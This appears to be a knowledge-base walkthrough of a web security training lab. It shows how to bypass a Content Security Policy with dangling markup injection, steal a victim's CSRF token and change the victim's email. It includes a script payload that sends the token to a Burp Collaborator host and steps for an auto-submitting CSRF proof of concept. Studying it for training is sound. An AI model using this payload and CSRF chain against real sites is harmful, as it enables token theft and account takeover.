---
id: 9565fef6-a75c-44a7-833b-baf488ef0fdc
name: Reflected XSS Protected By CSP With Dangling Markup Attack
type: procedure
verified: true
submitted: true
created_at: '2020-08-24T16:31:11.852843+00:00'
updated_at: '2023-05-26T01:09:47.716862+00:00'
platforms:
- Web
tags:
- '[[CSRF]]'
- '[[Web Applications]]'
---

# Reflected XSS Protected By CSP With Dangling Markup Attack

**Status**: ✓ Verified

## Summary

Dangling markup injection attack technique is used where a XSS attack isnt possible. 

## Description

# Description

Dangling markup injection attack technique is used where a XSS attack isnt possible. 

# Instructions

1.Login to the application .

2.Use Burp professional ,launch burp collaborator 

3.Click on *copy to clipboard* to copy the unique collaborator url.

4.Craft a exploit with the following payload and submit the exploit to the server.Deliver the exploit to the victim . 

payload : 

*<script>
location='https://your-lab-id.web-security-academy.net/email?email=%22%3E%3Ctable%20background=%27//your-collaborator-id.burpcollaborator.net?';
</script>*

5. Go back to collaborator window and click on poll now to generate responses from the application. 

6. Observe the HTTP response in the collaborator window and copy the user's CSRF token.

7.Submit the request to change email to some random address with burp's intercept on.

8.change the value of email parameter in the burp's intercept as below.

9.Right click on the aboe request and select* CSRF PoC generator* form *engagement tools*. 

10. Click on *options *and make sure that the* include auto-submit* script is selected.

11. Click on *regenerate* to change the CSRF token to the stolen token from burp collaborator and then click *copyHTML*. Go back to the exploit server in step 4 and paste the CSRF HTML generated from above step. Deliver the form to the victim . Upon clicking the xploit the user's emailId changes to the email present in the exploit.

## Platforms

- Web

## Tags

- [[CSRF]]
- [[Web Applications]]
